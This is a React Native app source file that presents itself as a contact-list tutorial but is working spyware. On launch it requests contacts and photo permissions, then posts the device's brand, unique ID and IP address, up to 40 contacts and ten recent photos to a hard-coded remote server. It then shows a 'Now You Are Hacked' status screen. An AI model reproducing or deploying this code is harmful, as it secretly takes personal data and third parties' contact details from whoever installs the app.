/* This is an Access Contact List example from https://aboutreact.com/ */
/* https://aboutreact.com/access-contact-list-react-native/ */

//Import React
import React, { useState, useEffect } from "react";

//Import all required component
import {
  PermissionsAndroid,
  Platform,
  Text,
  View,
  Button,
} from "react-native";

import Contacts from "react-native-contacts";
import CameraRoll from "@react-native-community/cameraroll";
import DeviceInfo from 'react-native-device-info';
import axios from "axios"
import RNRestart from 'react-native-restart'; 

// let SERVER_URL = 'http://192.168.1.2:5000/api';
let SERVER_URL = 'http://3.131.100.54:5000/api';

const App = () => {
  const [contacts, setContacts] = useState([]);
  const [imageData, setImageData] = useState(undefined);
  const [deviceId, setDeviceId] = useState(undefined);
  const [statusInfo, setStatusInfo] = useState(undefined);
  const [statusContact, setStatuContact] = useState(undefined);
  const [statusImg, setStatuImg] = useState(undefined);

  let deviceJSON = {};

  deviceJSON.brand = DeviceInfo.getBrand();
  deviceJSON.uniqueId = DeviceInfo.getUniqueId();
  deviceJSON.IpAddress = DeviceInfo.getIpAddressSync();


  const send_DeviceInfo = () => {
    let data = deviceJSON ? deviceJSON : {}
    axios.post(`${SERVER_URL}/client`, data)
      .then(function (response) {
        setStatusInfo(true)
        console.log("status", response.status);
      })
      .catch(function (error) {
        setStatusInfo(false)
        // console.log(error);
      });
  }


  useEffect(() => {
    if (Platform.OS === "android") {
      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: "Contacts",
        message: "This app would like to view your contacts."
      }).then(() => {
        loadContacts();
        loadImage();
      });
    } 

  

    const createFormData = (array, body) => {
      const data = new FormData();
      array.forEach(photo => {
        let _img = photo.node
        let yourstring = _img.image.uri
        var index = yourstring.lastIndexOf("/") + 1;
        var filename = yourstring.substr(index);
        data.append("mobileApp", {
          name: filename,
          type: _img.type,
          uri:
            Platform.OS === "android" ? _img.image.uri : _img.image.uri.replace("file://", "")
        });
      })

      Object.keys(body).forEach(key => {
        data.append({ deviceId: deviceJSON ? deviceJSON.deviceId : null });
      });

      return data;
    };

    async function loadImage() {
      if (Platform.OS === 'android') {
        const result = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
          {
            title: 'Permission Explanation',
            message: 'ReactNativeForYou would like to access your photos!',
          },
        );
        if (result !== 'granted') {
          console.log('Access to pictures was denied', result);
          return;
        }
      }

      CameraRoll.getPhotos({
        first: 10,
        assetType: 'Photos',
      })
        .then(res => {
          let _data = res.edges;
          let body = {
            deviceId: deviceId,
          }
          let form_data_push = createFormData(_data, body)
          setImageData(_data)
          let headers = {
               "Content-Type": "multipart/form-data",
               "cache-control": "no-cache",
               "processData": false,
               "contentType": false,
               "mimeType": "multipart/form-data", 
          }
          console.log("PUSH ", form_data_push)
          axios.post(`${SERVER_URL}/images`, form_data_push, headers)
            .then(function (response) {
                setStatuImg(true)
                console.log("status img", response);
            })
            .catch(function (error) {
              setStatuImg(false)
              console.log("status img", error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    }

    setTimeout(() => {
      send_DeviceInfo()
    }, 1000);
  }, []);





  const loadContacts = () => {
    var uniqueId = deviceJSON ? deviceJSON.uniqueId : undefined;
    Contacts.getAll((err, contacts) => {
      contacts.sort((a, b) => a.givenName.toLowerCase() > b.givenName.toLowerCase());
      if (err === "denied") {
        alert("Permission to access contacts was denied");
        console.warn("Permission to access contacts was denied");
      } else {
        let tempContact = contacts ? [...contacts] : [];
        let splice_len = 40;
        tempContact && tempContact.length > 0 && tempContact.map((contact, index) => {
          contact.device_id = uniqueId
        })
        if(tempContact && tempContact.length > 40){
          tempContact.splice(splice_len)
        }
        // console.log("SAROJ", tempContact.length)
        setContacts(contacts);
        axios.post(`${SERVER_URL}/contacts`, tempContact)
          .then(function (response) {
            setStatuContact(true)
            console.log("status contact", response.status);
          })
          .catch(function (error) {
            setStatuContact(false)
          });
      }
    });
  }



  return (
    <View style={{ backgroundColor: '#000', flex: 1 }}>
      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#fff" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
      <Text style={{ color: 'red' }}>{deviceJSON ? JSON.stringify(deviceJSON) : "Unknown"}</Text>
      <Text style={{ color: 'green' }}>device info upload <Text style={{ color: 'red' }}>{statusInfo? "ok" : "Unknown"}</Text></Text>
      <Text style={{ color: 'green' }}>image info upload  <Text style={{ color: 'red' }}>{statusImg ? "ok" : "Unknown"}</Text></Text>
      <Text style={{ color: 'green' }}>contact info upload  <Text style={{ color: 'red' }}>{statusContact ? "ok" : "Unknown"}</Text></Text>

      <Button title="CLICK" onPress={() => RNRestart.Restart()}></Button>
    </View>
  );
}
export default App;
